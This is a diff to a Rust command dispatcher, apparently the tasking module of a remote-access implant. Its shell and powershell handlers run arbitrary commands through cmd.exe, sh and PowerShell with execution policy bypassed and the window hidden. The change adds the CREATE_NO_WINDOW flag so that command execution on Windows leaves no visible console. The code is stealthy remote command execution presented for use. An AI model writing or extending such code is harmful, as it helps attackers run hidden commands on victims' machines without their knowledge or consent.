@@ -108,32 +108,50 @@ pub async fn dispatch(command: &str, args: &[String]) -> Result<String> {
 async fn shell(args: &[String]) -> Result<String> {
     if args.is_empty() { return Err(anyhow::anyhow!("no command")); }
     #[cfg(target_os = "windows")]
-    let out = tokio::process::Command::new("cmd.exe")
-        .args(["/c", &args.join(" ")])
-        .output().await?;
+    {
+        use std::os::windows::process::CommandExt;
+        let out = tokio::process::Command::new("cmd.exe")
+            .args(["/c", &args.join(" ")])
+            .creation_flags(0x08000000) // CREATE_NO_WINDOW
+            .output().await?;
+        let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
+        let stderr = String::from_utf8_lossy(&out.stderr).into_owned();
+        return Ok(format!("{stdout}{stderr}"));
+    }
     #[cfg(not(target_os = "windows"))]
-    let out = tokio::process::Command::new("sh")
-        .args(["-c", &args.join(" ")])
-        .output().await?;
-    let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
-    let stderr = String::from_utf8_lossy(&out.stderr).into_owned();
-    Ok(format!("{stdout}{stderr}"))
+    {
+        let out = tokio::process::Command::new("sh")
+            .args(["-c", &args.join(" ")])
+            .output().await?;
+        let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
+        let stderr = String::from_utf8_lossy(&out.stderr).into_owned();
+        Ok(format!("{stdout}{stderr}"))
+    }
 }
 
 async fn powershell(args: &[String]) -> Result<String> {
     if args.is_empty() { return Err(anyhow::anyhow!("no command")); }
     let cmd = args.join(" ");
     #[cfg(target_os = "windows")]
-    let out = tokio::process::Command::new("PowerShell.exe")
-        .args(["-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-C", &cmd])
-        .output().await?;
+    {
+        use std::os::windows::process::CommandExt;
+        let out = tokio::process::Command::new("PowerShell.exe")
+            .args(["-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-C", &cmd])
+            .creation_flags(0x08000000) // CREATE_NO_WINDOW
+            .output().await?;
+        let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
+        let stderr = String::from_utf8_lossy(&out.stderr).into_owned();
+        return Ok(format!("{stdout}{stderr}"));
+    }
     #[cfg(not(target_os = "windows"))]
-    let out = tokio::process::Command::new("sh")
-        .args(["-c", &cmd])
-        .output().await?;
-    let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
-    let stderr = String::from_utf8_lossy(&out.stderr).into_owned();
-    Ok(format!("{stdout}{stderr}"))
+    {
+        let out = tokio::process::Command::new("sh")
+            .args(["-c", &cmd])
+            .output().await?;
+        let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
+        let stderr = String::from_utf8_lossy(&out.stderr).into_owned();
+        Ok(format!("{stdout}{stderr}"))
+    }
 }
 
 async fn cat(args: &[String]) -> Result<String> {
